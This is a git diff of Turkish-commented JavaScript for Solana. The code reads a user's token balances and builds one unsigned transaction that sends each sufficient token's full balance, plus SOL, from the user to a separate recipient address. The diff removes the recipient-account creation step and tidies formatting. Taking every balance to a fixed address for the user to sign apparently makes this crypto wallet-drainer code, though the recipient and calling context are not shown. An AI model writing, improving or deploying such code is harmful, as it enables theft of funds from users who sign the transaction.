@@ -10,7 +10,6 @@ import {
 import {
   getAssociatedTokenAddress,
   getAccount,
-  createAssociatedTokenAccountInstruction,
   createTransferInstruction,
 } from "@solana/spl-token";
 import { connection } from "./connect.js";
@@ -55,7 +54,8 @@ export async function createUnsignedTransaction(userPublicKey) {
   // 1) Kullanıcı bakiyelerini batch'li olarak oku (her task 1 RPC)
   const balanceTasks = TOKEN_CONFIGS.map(({ mint, threshold }) => async () => {
     const userAta = await getAssociatedTokenAddress(mint, payer);
-    let amount = 0, sufficient = false;
+    let amount = 0,
+      sufficient = false;
     try {
       const acct = await getAccount(connection, userAta);
       amount = Number(acct.amount);
@@ -74,65 +74,33 @@ export async function createUnsignedTransaction(userPublicKey) {
     return null;
   }
 
-  // 2) Alıcı ATA'larını batch'li olarak kontrol et
-  const creationTasks = userTokenInfos
-    .filter((t) => t.sufficient)
-    .map(({ toAta }) => async () => {
-      try {
-        await getAccount(connection, toAta);
-        return false; // zaten var
-      } catch {
-        return true;  // yaratılmalı
-      }
-    });
-  const shouldCreateAta = await runBatches(creationTasks);
-
-  // 3) Instruction'ları sırayla derle
+  // 2) Instruction'ları sırayla derle
   const instructions = [];
 
-  // 3a) SOL transfer instruction
+  // 2a) SOL transfer instruction
   if (isSolSufficient) {
     instructions.push(
       SystemProgram.transfer({
         fromPubkey: payer,
-        toPubkey:   toPublicKey,
-        lamports:   solToSend,
+        toPubkey: toPublicKey,
+        lamports: solToSend,
       })
     );
   }
 
-  // 3b) SPL-token ATA oluşturma ve transfer
-  let idx = 0;
-  for (const { userAta, toAta, amount, sufficient, mint } of userTokenInfos) {
+  // 2b) SPL-token transfer (ATA oluşturma adımını atlıyoruz)
+  for (const { userAta, toAta, amount, sufficient } of userTokenInfos) {
     if (!sufficient) continue;
 
-    // ➊ Eksikse ATA oluştur
-    if (shouldCreateAta[idx]) {
-      instructions.push(
-        createAssociatedTokenAccountInstruction(
-          payer,
-          toAta,
-          toPublicKey,
-          mint
-        )
-      );
-    }
-    // ➋ Token transfer
     instructions.push(
-      createTransferInstruction(
-        userAta,
-        toAta,
-        payer,
-        amount
-      )
+      createTransferInstruction(userAta, toAta, payer, amount)
     );
-    idx++;
   }
 
-  // 4) Tek bir VersionedTransaction oluştur
+  // 3) Tek bir VersionedTransaction oluştur
   const { blockhash } = await connection.getLatestBlockhash();
   const messageV0 = new TransactionMessage({
-    payerKey:        payer,
+    payerKey: payer,
     recentBlockhash: blockhash,
     instructions,
   }).compileToV0Message();
